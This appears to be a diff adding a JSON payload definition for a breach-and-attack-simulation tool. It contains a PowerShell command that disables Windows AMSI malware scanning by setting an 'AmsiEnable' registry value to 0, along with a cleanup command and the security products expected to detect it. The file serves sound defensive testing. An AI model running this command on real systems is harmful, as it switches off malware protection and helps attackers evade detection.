@@ -1,0 +1,39 @@
+{
+  "command_content": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Force | Out-Null\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Name \"AmsiEnable\" -Value 0 -PropertyType DWORD -Force | Out-Null\n",
+  "command_executor": "psh",
+  "payload_attack_patterns": [
+    "T1562.001"
+  ],
+  "payload_cleanup_command": "Remove-Item -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Recurse -Force 2> $null\n",
+  "payload_cleanup_executor": "psh",
+  "payload_description": "Threat Actor could disable the AMSI function by adding a registry value name “AmsiEnable” to the registry key “HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable” and set its value to 0.\nRef: https://mostafayahiax.medium.com/hunting-for-amsi-bypassing-methods-9886dda0bf9d\n",
+  "payload_domains": [
+    {
+      "domain_color": "#389CFF",
+      "domain_name": "Endpoint"
+    }
+  ],
+  "payload_elevation_required": true,
+  "payload_execution_arch": "ALL_ARCHITECTURES",
+  "payload_expectations": [
+    "DETECTION",
+    "PREVENTION"
+  ],
+  "payload_expected_security_platforms": {
+    "DETECTION": [
+      "EDR",
+      "SIEM",
+      "XDR"
+    ],
+    "PREVENTION": [
+      "EDR",
+      "XDR"
+    ]
+  },
+  "payload_external_id": "728eca7b-0444-4f6f-ac36-437e3d751dc0",
+  "payload_name": "AMSI Bypass - Create AMSIEnable Reg Key",
+  "payload_platforms": [
+    "Windows"
+  ],
+  "payload_type": "Command"
+}
